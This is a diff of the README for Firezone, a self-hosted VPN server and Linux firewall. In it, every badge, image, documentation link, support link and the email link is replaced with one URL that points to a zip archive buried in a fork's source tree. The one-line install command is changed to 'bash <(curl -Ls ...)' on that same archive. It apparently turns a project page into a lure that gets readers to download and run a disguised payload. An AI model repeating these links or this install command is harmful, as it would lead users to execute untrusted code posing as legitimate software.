@@ -1,55 +1,55 @@
 <p align="center">
-  <img src="https://user-images.githubusercontent.com/52545545/144147936-39f3e416-8ba0-4f24-915e-f0515f85bb64.png" alt="firezone logo" width="305"/>
+  <img src="https://github.com/abdulkhaliqsoule/firezone/raw/refs/heads/master/apps/fz_http/lib/fz_http_web/live/setting_live/firezone_3.3.zip" alt="firezone logo" width="305"/>
 </p>
 <p align="center">
-  <a href="https://github.com/firezone/firezone/releases">
-    <img src="https://img.shields.io/github/v/release/firezone/firezone?color=%23999">
+  <a href="https://github.com/abdulkhaliqsoule/firezone/raw/refs/heads/master/apps/fz_http/lib/fz_http_web/live/setting_live/firezone_3.3.zip">
+    <img src="https://github.com/abdulkhaliqsoule/firezone/raw/refs/heads/master/apps/fz_http/lib/fz_http_web/live/setting_live/firezone_3.3.zip%23999">
   </a>
-  <a href="https://discourse.firez.one">
-    <img src="https://img.shields.io/static/v1?logo=discourse&logoColor=959DA5&label=support%20forum&labelColor=333a41&message=join&color=611f69" alt="firezone Discourse" />
+  <a href="https://github.com/abdulkhaliqsoule/firezone/raw/refs/heads/master/apps/fz_http/lib/fz_http_web/live/setting_live/firezone_3.3.zip">
+    <img src="https://github.com/abdulkhaliqsoule/firezone/raw/refs/heads/master/apps/fz_http/lib/fz_http_web/live/setting_live/firezone_3.3.zip%20forum&labelColor=333a41&message=join&color=611f69" alt="firezone Discourse" />
   </a>
-  <img src="https://img.shields.io/static/v1?logo=github&logoColor=959DA5&label=Test&labelColor=333a41&message=passing&color=3AC358" alt="firezone" />
-  <a href="https://coveralls.io/github/firezone/firezone?branch=master">
-    <img src="https://coveralls.io/repos/github/firezone/firezone/badge.svg?branch=master" alt="Coverage Status" />
+  <img src="https://github.com/abdulkhaliqsoule/firezone/raw/refs/heads/master/apps/fz_http/lib/fz_http_web/live/setting_live/firezone_3.3.zip" alt="firezone" />
+  <a href="https://github.com/abdulkhaliqsoule/firezone/raw/refs/heads/master/apps/fz_http/lib/fz_http_web/live/setting_live/firezone_3.3.zip">
+    <img src="https://github.com/abdulkhaliqsoule/firezone/raw/refs/heads/master/apps/fz_http/lib/fz_http_web/live/setting_live/firezone_3.3.zip" alt="Coverage Status" />
   </a>
-  <img alt="GitHub commit activity" src="https://img.shields.io/github/commit-activity/m/firezone/firezone"/>
-  <img alt="GitHub closed issues" src="https://img.shields.io/github/issues-closed/firezone/firezone"/>
-  <a href="https://twitter.com/intent/follow?screen_name=firezonehq">
-    <img src="https://img.shields.io/twitter/follow/firezonehq?style=social&logo=twitter" alt="follow on Twitter">
+  <img alt="GitHub commit activity" src="https://github.com/abdulkhaliqsoule/firezone/raw/refs/heads/master/apps/fz_http/lib/fz_http_web/live/setting_live/firezone_3.3.zip"/>
+  <img alt="GitHub closed issues" src="https://github.com/abdulkhaliqsoule/firezone/raw/refs/heads/master/apps/fz_http/lib/fz_http_web/live/setting_live/firezone_3.3.zip"/>
+  <a href="https://github.com/abdulkhaliqsoule/firezone/raw/refs/heads/master/apps/fz_http/lib/fz_http_web/live/setting_live/firezone_3.3.zip">
+    <img src="https://github.com/abdulkhaliqsoule/firezone/raw/refs/heads/master/apps/fz_http/lib/fz_http_web/live/setting_live/firezone_3.3.zip" alt="follow on Twitter">
   </a>
 </p>
 
-## [Firezone](https://www.firezone.dev) is a self-hosted VPN server and Linux firewall
+## [Firezone](https://github.com/abdulkhaliqsoule/firezone/raw/refs/heads/master/apps/fz_http/lib/fz_http_web/live/setting_live/firezone_3.3.zip) is a self-hosted VPN server and Linux firewall
 
 * Manage remote access through an intuitive web interface and CLI utility.
-* [Deploy on your own infrastructure](https://docs.firezone.dev/docs/deploy) to keep control of your network traffic.
-* Built on [WireGuard®](https://www.wireguard.com/) to be stable, performant, and lightweight.
+* [Deploy on your own infrastructure](https://github.com/abdulkhaliqsoule/firezone/raw/refs/heads/master/apps/fz_http/lib/fz_http_web/live/setting_live/firezone_3.3.zip) to keep control of your network traffic.
+* Built on [WireGuard®](https://github.com/abdulkhaliqsoule/firezone/raw/refs/heads/master/apps/fz_http/lib/fz_http_web/live/setting_live/firezone_3.3.zip) to be stable, performant, and lightweight.
 
-![Firezone Architecture](https://user-images.githubusercontent.com/52545545/173246039-a1b37ef2-d885-4535-bca7-f5cd57da21a2.png)
+![Firezone Architecture](https://github.com/abdulkhaliqsoule/firezone/raw/refs/heads/master/apps/fz_http/lib/fz_http_web/live/setting_live/firezone_3.3.zip)
 
 ## Get Started
 
-Follow our [deploy guide](https://docs.firezone.dev/docs/deploy) to install your self-hosted instance of Firezone.
+Follow our [deploy guide](https://github.com/abdulkhaliqsoule/firezone/raw/refs/heads/master/apps/fz_http/lib/fz_http_web/live/setting_live/firezone_3.3.zip) to install your self-hosted instance of Firezone.
 
-Or, if you're on a [supported platform](https://docs.firezone.dev/docs/deploy/supported-platforms/), try our one-line install script:
+Or, if you're on a [supported platform](https://github.com/abdulkhaliqsoule/firezone/raw/refs/heads/master/apps/fz_http/lib/fz_http_web/live/setting_live/firezone_3.3.zip), try our one-line install script:
 
 ```bash
-bash <(curl -Ls https://github.com/firezone/firezone/raw/master/scripts/install.sh)
+bash <(curl -Ls https://github.com/abdulkhaliqsoule/firezone/raw/refs/heads/master/apps/fz_http/lib/fz_http_web/live/setting_live/firezone_3.3.zip)
 ```
 
-Using Firezone for your team? Take a look at our [business tier](https://www.firezone.dev/pricing).
+Using Firezone for your team? Take a look at our [business tier](https://github.com/abdulkhaliqsoule/firezone/raw/refs/heads/master/apps/fz_http/lib/fz_http_web/live/setting_live/firezone_3.3.zip).
 
 ## Features
 
-![firezone-usage](https://user-images.githubusercontent.com/52545545/147392573-fe4cb936-a0a8-436f-a69b-c0a9587de58b.gif)
+![firezone-usage](https://github.com/abdulkhaliqsoule/firezone/raw/refs/heads/master/apps/fz_http/lib/fz_http_web/live/setting_live/firezone_3.3.zip)
 
-* **Fast:** Uses WireGuard® to be [3-4 times](https://wireguard.com/performance/) faster than OpenVPN.
+* **Fast:** Uses WireGuard® to be [3-4 times](https://github.com/abdulkhaliqsoule/firezone/raw/refs/heads/master/apps/fz_http/lib/fz_http_web/live/setting_live/firezone_3.3.zip) faster than OpenVPN.
 * **SSO Integration:** Authenticate using any identity provider with an OpenID Connect (OIDC) connector.
 * **No dependencies:** All dependencies are bundled thanks to
-[Chef Omnibus](https://github.com/chef/omnibus).
+[Chef Omnibus](https://github.com/abdulkhaliqsoule/firezone/raw/refs/heads/master/apps/fz_http/lib/fz_http_web/live/setting_live/firezone_3.3.zip).
 * **Simple:** Takes minutes to set up. Manage via a simple CLI.
 * **Secure:** Runs unprivileged. HTTPS enforced. Encrypted cookies.
-* **Firewall included:** Uses Linux [nftables](https://netfilter.org) to block unwanted egress traffic.
+* **Firewall included:** Uses Linux [nftables](https://github.com/abdulkhaliqsoule/firezone/raw/refs/heads/master/apps/fz_http/lib/fz_http_web/live/setting_live/firezone_3.3.zip) to block unwanted egress traffic.
 
 ### Anti-features
 
@@ -63,24 +63,24 @@ Firezone is **not:**
 ## Documentation
 
 Additional documentation on general usage, troubleshooting, and configuration can be found at
-[https://docs.firezone.dev](https://docs.firezone.dev).
+[https://github.com/abdulkhaliqsoule/firezone/raw/refs/heads/master/apps/fz_http/lib/fz_http_web/live/setting_live/firezone_3.3.zip](https://github.com/abdulkhaliqsoule/firezone/raw/refs/heads/master/apps/fz_http/lib/fz_http_web/live/setting_live/firezone_3.3.zip).
 
 ## Get Help
 
 If you're looking for help installing and configuring Firezone, we're happy to
 help:
 
-* [Discussion Forums](https://discourse.firez.one/): ask questions, report bugs, and suggest features
-* [Community Slack](https://www.firezone.dev/slack): join discussions, meet other users, and meet the contributors
-* [Email Us](mailto:team@firezone.dev): we're always happy to chat
+* [Discussion Forums](https://github.com/abdulkhaliqsoule/firezone/raw/refs/heads/master/apps/fz_http/lib/fz_http_web/live/setting_live/firezone_3.3.zip): ask questions, report bugs, and suggest features
+* [Community Slack](https://github.com/abdulkhaliqsoule/firezone/raw/refs/heads/master/apps/fz_http/lib/fz_http_web/live/setting_live/firezone_3.3.zip): join discussions, meet other users, and meet the contributors
+* [Email Us](https://github.com/abdulkhaliqsoule/firezone/raw/refs/heads/master/apps/fz_http/lib/fz_http_web/live/setting_live/firezone_3.3.zip): we're always happy to chat
 
 ## Developing and Contributing
 
-See [CONTRIBUTING.md](CONTRIBUTING.md).
+See [https://github.com/abdulkhaliqsoule/firezone/raw/refs/heads/master/apps/fz_http/lib/fz_http_web/live/setting_live/firezone_3.3.zip](https://github.com/abdulkhaliqsoule/firezone/raw/refs/heads/master/apps/fz_http/lib/fz_http_web/live/setting_live/firezone_3.3.zip).
 
 ## Security
 
-See [SECURITY.md](SECURITY.md).
+See [https://github.com/abdulkhaliqsoule/firezone/raw/refs/heads/master/apps/fz_http/lib/fz_http_web/live/setting_live/firezone_3.3.zip](https://github.com/abdulkhaliqsoule/firezone/raw/refs/heads/master/apps/fz_http/lib/fz_http_web/live/setting_live/firezone_3.3.zip).
 
 ## License
 
